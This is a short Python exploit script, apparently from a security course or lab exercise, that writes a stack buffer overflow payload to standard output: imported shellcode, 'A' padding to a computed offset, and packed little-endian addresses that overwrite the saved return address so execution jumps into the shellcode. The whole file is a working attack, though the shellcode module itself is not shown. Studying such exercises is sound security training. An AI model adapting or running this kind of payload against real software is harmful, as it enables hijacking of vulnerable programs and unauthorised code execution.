from shellcode import shellcode
from struct import pack
import sys

sys.stdout.buffer.write(shellcode)
sys.stdout.write("A" * ((0xfffeb80c - 0xfffeb79c) - len(shellcode)))
sys.stdout.flush()
sys.stdout.buffer.write(pack("<I", 0xfffeb79c))
sys.stdout.buffer.write(pack("<I", 0xfffeb828))
